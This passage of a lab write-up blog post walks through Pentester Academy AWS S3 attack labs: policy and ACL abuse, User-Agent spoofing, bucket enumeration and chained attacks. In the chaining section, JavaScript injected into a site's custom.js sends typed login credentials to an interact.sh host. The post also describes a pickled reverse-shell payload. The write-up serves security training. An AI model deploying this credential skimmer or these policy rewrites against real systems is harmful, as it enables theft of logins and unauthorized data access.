    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This allows reading the <code class="language-plaintext highlighter-rouge">this-is-flag</code> object to everyone.</p><hr /><h2 id="special-request"><span class="me-2">Special Request</span><a href="#special-request" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab gives a bucket that has the following policy →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:GetBucketPolicy"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-special-request-439586372472"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:GetObject"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-special-request-439586372472/flag"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Condition"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"StringLike"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"aws:UserAgent"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/*"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This allows reading the <code class="language-plaintext highlighter-rouge">flag</code> object if the request has a User Agent string as specified. Therefore, a <code class="language-plaintext highlighter-rouge">curl</code> request for the following can get the <code class="language-plaintext highlighter-rouge">flag</code> →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl https://s3-special-request-439586372472.s3.amazonaws.com/flag <span class="nt">-H</span> <span class="s2">"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/*"</span>
</pre></table></code></div></div><hr /><h2 id="writable-bucket-policy"><span class="me-2">Writable Bucket Policy</span><a href="#writable-bucket-policy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab gives a bucket which has the following policy →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"s3:GetBucketPolicy"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"s3:PutBucketPolicy"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-writable-policy-555466747704"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Deny"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:GetObject"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-writable-policy-555466747704/flag"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>The policy allows adding to i.e., modifying the bucket policy which can then be edited to remove the Deny rule for the <code class="language-plaintext highlighter-rouge">flag</code> object. The same policy can be used, except the Deny rule should be removed and the <code class="language-plaintext highlighter-rouge">GetObject</code> action added. Then apply the policy to the bucket as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn s3api put-bucket-policy <span class="nt">--policy</span> file://policy.json <span class="nt">--bucket</span> s3-writable-policy-555466747704
</pre></table></code></div></div><p>The policy would now become →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"s3:GetBucketPolicy"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"s3:PutBucketPolicy"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-writable-policy-555466747704"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s3:GetObject"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:s3:::s3-writable-policy-555466747704/flag"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Now, the <code class="language-plaintext highlighter-rouge">flag</code> object can be retrieved.</p><hr /><h2 id="writable-bucket-acl"><span class="me-2">Writable Bucket ACL</span><a href="#writable-bucket-acl" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab provides a bucket which has it’s ACL set to the following →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"Owner"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"DisplayName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jeswincloud+1615526435580"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"ID"</span><span class="p">:</span><span class="w"> </span><span class="s2">"53a8d91fd037af9e568205fb59b36cc80feabb24efe2fe0f8d1bddd86e409368"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"Grants"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Grantee"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"Type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Group"</span><span class="p">,</span><span class="w">
                </span><span class="nl">"URI"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://acs.amazonaws.com/groups/global/AuthenticatedUsers"</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="nl">"Permission"</span><span class="p">:</span><span class="w"> </span><span class="s2">"READ_ACP"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Grantee"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="nl">"Type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Group"</span><span class="p">,</span><span class="w">
                </span><span class="nl">"URI"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://acs.amazonaws.com/groups/global/AuthenticatedUsers"</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="nl">"Permission"</span><span class="p">:</span><span class="w"> </span><span class="s2">"WRITE_ACP"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This allows all global authenticated AWS users to read and write the access control policy for the bucket. Therefore, a change can be made to the first grant such that the permission if <code class="language-plaintext highlighter-rouge">READ</code> instead of <code class="language-plaintext highlighter-rouge">READ_ACP</code> so that not only can the ACP but also the contents. This gives the secret bucket which can be used to read the flag. To apply the policy, the following is used →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># policy.json holds the modified access control policy</span>
awsn s3api put-bucket-acl <span class="nt">--bucket</span> s3-secret-670128143243 <span class="nt">--access-control-policy</span> file://policy.json
</pre></table></code></div></div><hr /><h2 id="writable-object-acl"><span class="me-2">Writable Object ACL</span><a href="#writable-object-acl" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Just like the Writable Bucket ACL, this labs gives a bucket with a restricted ACL for the <code class="language-plaintext highlighter-rouge">flag</code> object. Th policy is similar to that of the bucket in previous lab but for the object. Changing the <code class="language-plaintext highlighter-rouge">READ_ACP</code> to <code class="language-plaintext highlighter-rouge">READ</code> can allow reading the object, however will disallow reading the access contorl policy. It can be updated as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn s3api put-object-acl <span class="nt">--key</span> flag <span class="nt">--bucket</span> s3-secret-357630943120 <span class="nt">--access-control-policy</span> file://policy.json
</pre></table></code></div></div><p>This allows reading the <code class="language-plaintext highlighter-rouge">flag</code> object.</p><hr /><h2 id="guessable-bucket"><span class="me-2">Guessable Bucket</span><a href="#guessable-bucket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab gives an Ubuntu instance with an S3 endpoint. The buckets can be enumerated against a list of names by using a wordlist as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /usr/share/dirb/wordlists/small.txt <span class="si">)</span>
<span class="k">do </span>curl <span class="nt">-s</span> http://192.167.222.3:9000/<span class="nv">$i</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"(NoSuchBucket)|(specified bucket is not valid)"</span><span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><p>This gives the bucket as <code class="language-plaintext highlighter-rouge">secret</code> and the flag can be retrieved as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> http://192.167.222.3:9000/secret/FLAG
</pre></table></code></div></div><hr /><h2 id="chaining-attacks"><span class="me-2">Chaining Attacks</span><a href="#chaining-attacks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab gives an IAM user who has some access to S3. There are two buckets and the static files store and the main bucket contents can be retrieved using the following command →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># For static bucket, remove static to list for the other bucket</span>
awsn s3api list-objects <span class="nt">--bucket</span> s3-file-load-static-431664597780 | jq <span class="s1">'.Contents[] | .Key'</span>
</pre></table></code></div></div><p>The bucket policy for the main website is hidden and not authorized for our user or anonymous users to edit however, the one for the static content is as follows →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Sid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AllObjectActions"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"s3:Get*"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"s3:Put*"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"s3:List*"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"arn:aws:s3:::s3-file-load-static-431664597780/*"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"arn:aws:s3:::s3-file-load-static-431664597780"</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Therefore, anyone can add to or edit the content. An example would be to carry out an XSS attack. The source code of the main website uses a <code class="language-plaintext highlighter-rouge">custom.js</code> code which is situated in the static content bucket. This can be edited due to the policy and introduce an XSS bug.</p><p>List the javascript files in the static buckets using the following code →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn s3api list-objects <span class="nt">--bucket</span> s3-file-load-static-431664597780 <span class="nt">--prefix</span> <span class="s2">"static/javascript"</span>
</pre></table></code></div></div><p>The modified javascript file can be uploaded as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn s3api put-object <span class="nt">--bucket</span> s3-file-load-static-108536353935 <span class="nt">--key</span> <span class="s2">"static/javascript/custom.js"</span> <span class="nt">--body</span> custom.js
</pre></table></code></div></div><p>The edited javascript can be seen below →</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">makeRequest</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>

    <span class="nx">xhttp</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">output</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">output</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Invalid Credentials</span><span class="dl">"</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">};</span>
    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://ahyk95vfo5.execute-api.us-west-2.amazonaws.com/dev?username=</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#pi3</span><span class="dl">'</span><span class="p">).</span><span class="nf">val</span><span class="p">()</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;password=</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#pi4</span><span class="dl">'</span><span class="p">).</span><span class="nf">val</span><span class="p">();</span>
    <span class="nx">xhttp</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">xhttp</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">output</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;img src='http://c9et0w32vtc0000btwzggrzpyqryyyyyb.interact.sh/creds?username=' + $('#pi3').val() + '&amp;password=' + $('#pi4').val() /&gt;</span><span class="dl">"</span><span class="p">;</span>
    <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">XSS</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><hr /><h2 id="python-object-store"><span class="me-2">Python Object Store</span><a href="#python-object-store" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab gives a web server running from S3 which has public access to listing the <code class="language-plaintext highlighter-rouge">assets</code> bucket which also contains information about sessions. Each session is represented by a token which basically holds the credentials of the service in a python pickle format. A payload for a reverse shell can be pickled in python and uploaded in place of the session such that when the web session reloads, the session will launch a reverse shell if the attacker machine is listening. With the shell, root privileges are obtained and can be used to retrieve the flag.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/aws-labs/">AWS Labs</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/aws/" class="post-tag no-text-decoration" >aws</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/pentester-academy/" class="post-tag no-text-decoration" >pentester-academy</a> <a href="/blog/tags/s3/" class="post-tag no-text-decoration" >s3</a> <a href="/blog/tags/security/" class="post-tag no-text-decoration" >security</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Pentester%20Academy%20AWS%20S3%20Attack%20Lab%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fpentester-academy-aws-s3%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Pentester%20Academy%20AWS%20S3%20Attack%20Lab%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fpentester-academy-aws-s3%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fpentester-academy-aws-s3%2F&text=Pentester%20Academy%20AWS%20S3%20Attack%20Lab%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fpentester-academy-aws-s3%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-linkwarden/">Bookmark Manager in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-budgeting/">Personal Finance Budgeting in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/entertainment-dbzcelltimeline/">Dragon Ball Z - Cell Saga Timeline 101</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-excalidraw/">Excalidraw in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-budgeter/">Expense Tracking in Home Lab</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/linux/">linux</a></div></section></div><section id="toc-wrapper" class="ps-0 pe-4"><h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/pentester-academy-aws-iam/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1651129200" data-df="ll" > Apr 28, 2022 </time><h4 class="pt-0 my-2">Pentester Academy AWS IAM Attack Lab</h4><div class="text-muted"><p> Enumeration To get information about current caller → awsn sts get-identity-caller List and see last uses for access keys → # List all access keys awsn iam list-access-keys # G...</p></div></div></a></article><article class="col"> <a href="/blog/posts/flaws-1/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1648710000" data-df="ll" > Mar 31, 2022 </time><h4 